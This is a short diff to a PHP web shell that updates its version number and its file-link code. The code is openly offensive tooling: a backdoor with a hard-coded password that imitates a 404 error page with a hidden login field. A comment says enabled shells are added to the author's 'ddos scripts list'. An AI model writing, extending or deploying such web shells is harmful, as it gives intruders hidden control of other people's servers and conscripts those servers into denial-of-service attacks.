@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 2.73;
+$version            = 2.74;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -1081,7 +1081,7 @@ function shownav(e){
             $thisbg  = bg();
             p('<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">');
             p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="' . $filedb['server_link'] . '"></td>');
-            p('<td>' . ((strpos($filedb['server_link'], $_SERVER["DOCUMENT_ROOT"]) !== false) ? '<a href="' . $fileurl . '" target="_blank">' . $filedb['filename'] . '</a>' : $filedb['filename']) . '</td>');
+            p('<td>' . ((strpos($filedb['server_link'], $_SERVER["DOCUMENT_ROOT"]) !== false) ? '<a href="' . (isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off' ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . (str_replace("//", "/", "/" . $fileurl)) . '" target="_blank">' . $filedb['filename'] . '</a>' : $filedb['filename']) . '</td>');
             p('<td nowrap><a href="javascript:opfile(\'newtime\',\'' . str_replace("'", "\'", $filedb['server_link']) . '\',\'' . $filedb['dirlink'] . '\');">' . $filedb['mtime'] . '</a></td>');
             p('<td nowrap>' . sizecount($filedb['size']) . '</td>');
             p('<td nowrap>');
